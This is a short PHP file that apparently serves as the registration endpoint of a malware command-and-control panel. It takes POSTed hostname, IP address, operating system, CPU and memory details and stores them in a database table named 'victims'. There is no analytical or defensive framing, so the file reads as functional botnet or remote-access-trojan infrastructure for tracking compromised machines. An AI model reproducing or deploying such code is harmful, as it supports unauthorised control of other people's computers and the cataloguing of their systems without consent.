<?php
    include 'conn.php';
    if($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["hostname"]) && isset($_POST["ip"]) && isset($_POST["operatingsystem"]) && isset($_POST["CPU"]) && isset($_POST["memory"]))  
    {
        $registerQuery = $mysql->prepare("insert into victims(hostname, ipaddress, operatingsystem, CPU, memory) value(?,?,?,?,?)");
        $registerQuery->bind_param("sssss", $_POST["hostname"], $_POST["ip"], $_POST["operatingsystem"], $_POST["CPU"], $_POST["memory"]);
        $registerQuery->execute();
    }
?>
